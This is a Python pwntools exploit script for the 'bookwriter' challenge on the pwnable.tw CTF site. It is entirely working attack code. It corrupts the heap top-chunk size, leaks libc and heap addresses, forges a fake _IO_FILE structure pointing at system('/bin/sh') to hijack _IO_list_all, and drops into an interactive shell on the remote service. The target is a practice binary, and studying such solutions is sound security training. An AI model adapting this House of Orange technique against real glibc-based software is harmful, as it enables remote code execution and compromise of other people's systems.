#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys

local = 0
debug = 0

def conn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./bookwriter_patched')
		if debug:
			gdb.attach(s, gdbscript='''
				b*_IO_flush_all_lockp
				b*__libc_system
				c
			''')
		else:
			#raw_input('DEBUG')
			pass
	else:
		s = remote('chall.pwnable.tw', 10304)

	return s

elf = ELF('bookwriter_patched')
libc = ELF('libc_64.so.6')

def add(size, content):
	s.sendlineafter(b'Your choice :', b'1')
	s.sendlineafter(b'Size of page :', str(size).encode())
	s.sendafter(b'Content :', content)

def view(index):
	s.sendlineafter(b'Your choice :', b'2')
	s.sendlineafter(b'Index of page :', str(index).encode())
	s.recvuntil(b'Content :')

def edit(index, content):
	s.sendlineafter(b'Your choice :', b'3')
	s.sendlineafter(b'Index of page :', str(index).encode())
	s.sendafter(b'Content:', content)	

def information(author = None):
	s.sendlineafter(b'Your choice :', b'4')
	s.recvuntil(b'Author : ')
	data = s.recvline()
	if author:
		s.sendlineafter(b'Do you want to change the author ? (yes:1 / no:0) ', b'1')
		s.sendlineafter(b'Author :', author)
	else:
		s.sendlineafter(b'Do you want to change the author ? (yes:1 / no:0) ', b'0')
	return data

while True:
	try:
		s = conn()

		author = 0x602060
		page = 0x6020A0
		page_size = 0x6020E0

		s.sendlineafter(b'Author :', b'A' * 0x40)

		add(0x38, b'A' * 0x38)
		edit(0, b'A' * 0x38)
		edit(0, b'\x00' * 0x38 + b'\xc1\x0f\x00')
		add(0x1000, b'A')
		add(0x10, b'A' * 8)

		view(2)
		s.recvuntil(b'AAAAAAAA')
		libc.address = int.from_bytes(s.recv(6), byteorder = 'little', signed = False) - 0x3c4188
		log.info('Libc base: 0x%x', libc.address)

		d = information()
		heap_base = int.from_bytes(d[64:-1], byteorder = 'little', signed = False) - 0x10
		log.info('Heap base: 0x%x', heap_base)
		log.info('_IO_list_all: 0x%x', libc.symbols['_IO_list_all'])

		for i in range(6):
			add(0x10, b'A')

		payload = b'/bin/sh\x00' + p64(0x61)
		payload += p64(0) + p64(libc.symbols['_IO_list_all'] - 0x10)
		payload += p64(2) + p64(3)
		payload += p64(0) * 21
		payload += p64(heap_base + 0x200)
		payload += p64(0) * 3 + p64(libc.symbols['system'])

		edit(0, b'\x00' * 0x110 + payload)

		s.sendlineafter(b'Your choice :', b'1')
		s.sendlineafter(b'Size of page :', b'1')

		s.sendline(b'ls')
		s.recv()

		break		
	except:
		s.close()
		continue

s.interactive()
